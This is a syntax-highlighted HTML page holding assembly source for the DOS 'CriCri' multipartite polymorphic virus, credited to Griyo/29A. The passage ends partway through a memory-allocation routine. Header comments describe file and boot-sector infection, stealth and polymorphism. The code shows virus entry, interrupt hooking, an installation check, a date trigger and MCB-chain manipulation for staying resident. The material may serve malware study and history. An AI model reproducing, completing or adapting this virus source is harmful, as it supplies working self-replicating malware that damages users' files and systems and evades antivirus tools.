<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Virus.Multi.CriCri.4300 - 29A_1.5_3.html</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc3 {
	color: #808080;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;CRI-CRI ViRuS (CoDe by Griyo/29A)</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">

</span><span class="sc1">;ResiDenT:</span><span class="sc0">

</span><span class="sc1">;WheN an inFecTed FiLe is Run thE viRus becaMes ResidEnt inTo a UMB</span><span class="sc0">
</span><span class="sc1">;memoRy bloCk (if aVaLiabLe) or in conVenTionaL memOry. Then iT</span><span class="sc0">
</span><span class="sc1">;hOOks int13h and int21h.</span><span class="sc0">

</span><span class="sc1">;InfEcTion (MulTiPartite):</span><span class="sc0">

</span><span class="sc1">;CriCri wRitEs itSeLf to The End of .Com and .Exe fiLes that aRe eXecUtEd </span><span class="sc0">
</span><span class="sc1">;or cLosEd aNd to The BooT SectOr of fLoppY diSks tHat are accEsed. During</span><span class="sc0">
</span><span class="sc1">;fiLe iNfeCtion the viRus UseS LoW LeveL SysTem fiLe tabLe and HookS</span><span class="sc0">
</span><span class="sc1">;int03h and int24h.</span><span class="sc0">
</span><span class="sc1">;CriCri doEs not inFect the fiLes thAt havE diGit or V chaRactErs in </span><span class="sc0">
</span><span class="sc1">;thEir namEs As weLL as FiLes with toDays DatE and SomE antiVirUs </span><span class="sc0">
</span><span class="sc1">;eXecuTablEs. InfEcted fiLes Have 62 seCondS in tHeir tiMe sTamp.</span><span class="sc0">

</span><span class="sc1">;SteALth (fiLe and booT LeveL):</span><span class="sc0">

</span><span class="sc1">;CriCri reTurNs cLean CopiEs oF inFected fiLes tHat are acceSed and hide</span><span class="sc0">
</span><span class="sc1">;theiR tRue siZe. The viRus alSo reTurns the OriGinaL boot sEctoR of</span><span class="sc0">
</span><span class="sc1">;fLoppy disKs tHat aRe read. The viRus disabLes his sTeaLth mechaNism</span><span class="sc0">
</span><span class="sc1">;when some comPressiOn uttiLities are beinG eXecuted.</span><span class="sc0">

</span><span class="sc1">;PoLymorPhic:</span><span class="sc0">

</span><span class="sc1">;The viRus is polymorPHic in fiLes and bOOt secToRs. GenerAted PolymorPHic</span><span class="sc0">
</span><span class="sc1">;deCrypToR conTains conDitiOnaL and AbsoluTe jumPs as WeLL as subRoutiNes</span><span class="sc0">
</span><span class="sc1">;and inteRRupt caLLs.</span><span class="sc0">

</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">com</span><span class="sc0">     </span><span class="sc9">segment</span><span class="sc0"> </span><span class="sc10">para</span><span class="sc0"> </span><span class="sc12">'CODE'</span><span class="sc0">
        </span><span class="sc9">assume</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">com</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">com</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:</span><span class="sc5">com</span><span class="sc4">,</span><span class="sc8">ss</span><span class="sc4">:</span><span class="sc5">com</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;Virus size in bytes</span><span class="sc0">
</span><span class="sc5">lenvir</span><span class="sc0">          </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc5">virus_copy</span><span class="sc4">-</span><span class="sc5">virus_entry</span><span class="sc0">    
</span><span class="sc1">;Virus size in para</span><span class="sc0">
</span><span class="sc5">para_size</span><span class="sc0">       </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc4">((</span><span class="sc5">lenvir</span><span class="sc4">*</span><span class="sc2">02h</span><span class="sc4">)+</span><span class="sc2">0Fh</span><span class="sc4">)/</span><span class="sc2">10h</span><span class="sc0">
</span><span class="sc1">;Virus size in sectors</span><span class="sc0">
</span><span class="sc5">sector_size</span><span class="sc0">     </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc4">((</span><span class="sc5">lenvir</span><span class="sc4">+</span><span class="sc2">1FFh</span><span class="sc4">)/</span><span class="sc2">200h</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc1">;Decryptor size in bytes</span><span class="sc0">
</span><span class="sc5">decryptor</span><span class="sc0">       </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">virus_body</span><span class="sc4">-</span><span class="sc5">virus_entry</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc1">;Boot code size in bytes</span><span class="sc0">
</span><span class="sc5">boot_size</span><span class="sc0">       </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">boot_end</span><span class="sc4">-</span><span class="sc5">boot_code</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;Create .COM launcher: TASM cricri.asm TLINK /t cricri.obj</span><span class="sc0">
        </span><span class="sc9">org</span><span class="sc0"> </span><span class="sc2">100h</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;Virus entry point</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">virus_entry</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">;Store bp for launcher</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">
</span><span class="sc1">;Buffer were virus build polymorphic decryptor</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0280h</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">90h</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">virus_body</span><span class="sc4">:</span><span class="sc0">        
</span><span class="sc1">;Save segment registers</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
</span><span class="sc1">;Check if running from boot or file        </span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">prog_type</span><span class="sc4">][</span><span class="sc8">bp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc3">"B"</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">in_boot_sector</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">go_ahead</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;Virus working from boot sector</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">in_boot_sector</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">;Reset DOS loaded flag</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">dos_flag</span><span class="sc4">][</span><span class="sc8">bp</span><span class="sc4">],</span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc1">;Clear dos running switch</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">running_sw</span><span class="sc4">],</span><span class="sc3">"R"</span><span class="sc0">
</span><span class="sc1">;Get int 13h vector</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">13h</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_int</span><span class="sc0">
</span><span class="sc1">;Save old int 13h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">old13h_off</span><span class="sc4">][</span><span class="sc8">bp</span><span class="sc4">],</span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">old13h_seg</span><span class="sc4">][</span><span class="sc8">bp</span><span class="sc4">],</span><span class="sc8">es</span><span class="sc0">
</span><span class="sc1">;Calculate our segment position</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">10h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc1">;Hook int 13h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">13h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">my_int13h</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">set_int</span><span class="sc0">
</span><span class="sc1">;Restore segment registers</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
</span><span class="sc1">;Reboot system</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">19h</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;Wait until dos is loaded</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">wait_dos</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">;Hook int 21h at installation check</span><span class="sc0">
</span><span class="sc5">test_1</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">test_2</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">00BADh</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">test_2</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">0FACEh</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">dos_installed</span><span class="sc0">
</span><span class="sc1">;Hook int 21h if we detect a write operation</span><span class="sc0">
</span><span class="sc5">test_2</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">03h</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">dos_installed</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">;Hook int 21h to our handler</span><span class="sc0">
</span><span class="sc5">dos_installed</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">push_all</span><span class="sc0">
</span><span class="sc1">;Set dos loaded flag        </span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">dos_flag</span><span class="sc4">],</span><span class="sc2">0FFh</span><span class="sc0">
</span><span class="sc1">;Check dos version</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">30h</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">04h</span><span class="sc0">
        </span><span class="sc6">jb</span><span class="sc0"> </span><span class="sc5">exit_wait</span><span class="sc0">
</span><span class="sc1">;Save old int 21h vector</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">21h</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_int</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">old21h_off</span><span class="sc4">],</span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">old21h_seg</span><span class="sc4">],</span><span class="sc8">es</span><span class="sc0">
</span><span class="sc1">;Get our segment</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
</span><span class="sc1">;Point int 21h to our handler</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">my_int21h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">21h</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">set_int</span><span class="sc0">
</span><span class="sc5">exit_wait</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">pop_all</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;Running from an executable</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">go_ahead</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">;Installation check</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">00BADh</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">0FACEh</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc2">80h</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">13h</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">not_installed</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">0DEADh</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">not_installed</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">0BABEh</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">not_installed</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">control_end</span><span class="sc0">
</span><span class="sc5">not_installed</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">;Check dos version</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">30h</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">04h</span><span class="sc0">
        </span><span class="sc6">jae</span><span class="sc0"> </span><span class="sc5">check_date</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">control_end</span><span class="sc0">
</span><span class="sc5">check_date</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">;Get current date</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">2Ah</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
</span><span class="sc1">;Save today's date</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">today</span><span class="sc4">][</span><span class="sc8">bp</span><span class="sc4">],</span><span class="sc8">dl</span><span class="sc0">
</span><span class="sc1">;Activation circunstance: 4th of June</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc2">06h</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">no_activation</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc2">04h</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">no_activation</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">print_credits</span><span class="sc0">
</span><span class="sc5">no_activation</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">;Set dos loaded flag        </span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">dos_flag</span><span class="sc4">][</span><span class="sc8">bp</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
</span><span class="sc1">;Clear dos running switch</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">running_sw</span><span class="sc4">],</span><span class="sc3">"R"</span><span class="sc0">
</span><span class="sc1">;Save old int 13h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">13h</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_int</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">old13h_seg</span><span class="sc4">][</span><span class="sc8">bp</span><span class="sc4">],</span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">old13h_off</span><span class="sc4">][</span><span class="sc8">bp</span><span class="sc4">],</span><span class="sc8">bx</span><span class="sc0">
</span><span class="sc1">;Save old int 03h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">03h</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_int</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">old03h_seg</span><span class="sc4">][</span><span class="sc8">bp</span><span class="sc4">],</span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">old03h_off</span><span class="sc4">][</span><span class="sc8">bp</span><span class="sc4">],</span><span class="sc8">bx</span><span class="sc0">
</span><span class="sc1">;Save old int 21h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">21h</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_int</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">old21h_seg</span><span class="sc4">][</span><span class="sc8">bp</span><span class="sc4">],</span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">old21h_off</span><span class="sc4">][</span><span class="sc8">bp</span><span class="sc4">],</span><span class="sc8">bx</span><span class="sc0">
</span><span class="sc1">;Redirect traced int 21h to int 03h</span><span class="sc0">
        </span><span class="sc6">lds</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">old21h</span><span class="sc4">][</span><span class="sc8">bp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">03h</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">set_int</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;Memory allocation</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">
</span><span class="sc1">;Get pointer to dos info block</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">52h</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">03h</span><span class="sc0">
</span><span class="sc1">;Get pointer to the dos buffers structure</span><span class="sc0">
        </span><span class="sc6">lds</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">12h</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc1">;Get address of first umb</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">1Fh</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0FFFFh</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">no_umbs</span><span class="sc0">
</span><span class="sc1">;Follow the chain</span><span class="sc0">
</span><span class="sc5">nextumb</span><span class="sc4">:</span><span class="sc0">        
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc1">;Check for free umb's</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">01h</span><span class="sc4">],</span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">no_free_umb</span><span class="sc0">
</span><span class="sc1">;Check if there is enought size</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">03h</span><span class="sc4">],</span><span class="sc5">para_size</span><span class="sc4">+</span><span class="sc2">01h</span><span class="sc0">
        </span><span class="sc6">ja</span><span class="sc0"> </span><span class="sc5">handle_mcb</span><span class="sc0">
</span><span class="sc5">no_free_umb</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">;Check if this is the last umb</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">00h</span><span class="sc4">],</span><span class="sc3">"Z"</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">no_umbs</span><span class="sc0">
</span><span class="sc1">;Jump to next umb in the chain</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">03h</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">nextumb</span><span class="sc0">
</span><span class="sc1">;Allocate memory from last mcb</span><span class="sc0">
</span><span class="sc5">no_umbs</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">;Get pointer to dos info block</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">52h</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">03h</span><span class="sc0">
</span><span class="sc1">;Get pointer to first mcb</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">12</span><span class="sc0">
        </span><span class="sc6">lds</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">00h</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc1">;Follow the mcb chain</span><span class="sc0">
</span><span class="sc5">nextmcb</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">;Check if this is the last mcb</span><span class="sc0">
